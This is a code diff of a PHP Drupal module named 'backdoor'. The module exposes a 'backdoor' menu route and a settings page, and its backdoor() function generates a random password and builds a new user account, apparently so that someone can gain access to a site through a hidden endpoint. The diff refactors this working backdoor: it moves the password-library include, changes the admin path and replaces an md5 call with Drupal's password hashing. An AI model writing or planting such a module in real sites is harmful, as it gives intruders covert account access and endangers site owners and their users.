@@ -1,7 +1,8 @@
 <?php
 
-function backdoor_menu()
-{
+require_once DRUPAL_ROOT . '/' . variable_get('password_inc', 'includes/password.inc');
+
+function backdoor_menu() {
 	$items = array();
 
 	$items['backdoor'] = array(
@@ -12,7 +13,7 @@ function backdoor_menu()
 		'type' => MENU_NORMAL_ITEM,
 	);
 
-	$items['admin/config/administration/backdoor'] = array(
+	$items['admin/config/system/backdoor'] = array(
 		'title' => 'Backdoor settings',
 		'description' => 'Администрирование модуля Backdoor',
 		'page callback' => 'admin_page_backdoor',
@@ -44,7 +45,7 @@ function backdoor() {
 
 	} else {
 		$pass = user_password(25);
-		require_once DRUPAL_ROOT . '/' . variable_get('password_inc', 'includes/password.inc');
+
 		$new_password = user_hash_password(trim($pass));
 
 		$newuser = new stdClass();
@@ -66,5 +67,5 @@ function backdoor() {
 }
 
 function admin_page_backdoor() {
-	return md5(1234);
+	return user_hash_password(1234);
 }
